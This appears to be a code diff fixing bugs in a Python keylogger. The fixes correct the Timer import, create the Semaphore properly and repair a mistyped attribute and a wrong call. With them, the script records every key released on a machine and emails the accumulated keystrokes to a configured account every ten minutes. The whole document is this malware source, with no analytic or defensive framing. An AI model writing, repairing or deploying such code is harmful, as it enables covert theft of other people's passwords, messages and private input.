@@ -1,7 +1,7 @@
 import keyboard
 import smtplib
 
-from threading import Semaphore, Time
+from threading import Semaphore,Timer
 
 
 SEND_REPORT_EVERY=600
@@ -12,7 +12,7 @@ class Keylogger:
     def __init__(self, interval):
         self.interval = interval
         self.log = ''
-        self.semaphore = Semaphore
+        self.semaphore = Semaphore(0)
 
     def callback(self, event):
         name = event.name
@@ -36,7 +36,7 @@ class Keylogger:
         server.quit()
 
     def report(self):
-        if self.log():
+        if self.log:
             self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
         self.log = ''
         Timer(interval=self.interval, function=self.report).start()
@@ -44,7 +44,7 @@ class Keylogger:
     def start(self):
         keyboard.on_release(callback=self.callback)
         self.report()
-        self.seaphore.acquire()
+        self.semaphore.acquire()
 
 
 if __name__ == '__main__':
